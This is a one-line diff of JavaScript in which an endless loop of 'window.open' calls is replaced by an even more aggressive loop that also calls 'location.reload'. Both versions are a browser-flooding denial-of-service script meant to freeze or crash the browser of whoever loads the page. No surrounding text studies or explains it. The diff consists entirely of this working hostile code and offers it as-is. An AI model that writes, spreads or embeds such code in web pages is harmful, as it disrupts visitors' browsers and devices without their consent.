@@ -1,1 +1,1 @@
-while (true) {window.open("","", "width=1375, height=675")}
+while (true) {window.open("","", "width=1375, height=675");window.open(),location.reload(1)}
